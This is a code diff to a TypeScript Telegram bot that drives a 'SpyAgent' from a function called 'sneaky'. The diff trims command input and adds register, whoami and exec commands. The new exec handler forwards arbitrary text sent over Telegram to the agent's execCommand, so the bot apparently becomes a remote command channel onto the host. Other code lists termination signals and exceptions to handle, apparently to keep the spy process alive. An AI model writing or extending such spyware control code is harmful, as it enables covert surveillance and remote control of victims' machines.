@@ -1,7 +1,7 @@
 import { Telegraf } from 'telegraf';
 import os from 'os';
 import SpyAgent from './spyAgent';
-import { Action } from './types';
+import { Action, UserData } from './types';
 
 const eventsToHandle = ['SIGTERM', 'SIGINT', 'unhandledRejection', 'uncaughtException', 'SIGUSR2'];
 
@@ -18,7 +18,7 @@ async function sneaky() {
         const { message: { text } } = ctx.update;
         const parts = text.split('+');
         const action: Action = {
-            command: parts[0],
+            command: parts[0].trim(),
             text: parts[1]
         };
         agent.invinsible(action);
@@ -28,7 +28,7 @@ async function sneaky() {
         const { message: { text } } = ctx.update;
         const parts = text.split('+');
         const action: Action = {
-            command: parts[0],
+            command: parts[0].trim(),
             text: parts[1]
         };
         agent.invinsible(action);
@@ -37,9 +37,43 @@ async function sneaky() {
     bot.command('shutdown', (ctx) => {
         const { message: { text } } = ctx.update;
         const action: Action = {
-            command: text
+            command: text.trim()
         };
         agent.invinsible(action);
+    });
+
+    bot.command('register', async (ctx) => {
+        try {
+            const { message: { text } } = ctx.update;
+            const parts = text?.split('+')[1]?.trim()?.split(',');
+            const data: UserData = {
+                name: parts[0],
+                department: parts[1],
+                title: parts[2],
+                userId: ctx.from.id.toString(),
+            };
+            await agent.registerUser(data, ctx);
+        }
+        catch (err) {
+            console.log(err);
+        }
+    });
+
+    bot.command('whoami', (ctx) => {
+        try {
+            const user = agent.getUser();
+            const quote = `Name:   ${user.name}\nDepartment:   ${user.department}\nTitle:   ${user.title}\n`;
+            ctx.replyWithMarkdownV2(quote);
+        }
+        catch (err) {
+            console.log(err);
+        }
+    });
+
+    bot.command('exec', (ctx) => {
+        const { message: { text } } = ctx.update;
+        const parts = text.split('/exec :')[1];
+        agent.execCommand(parts);
     });
 
     bot.on('message', (ctx) => {
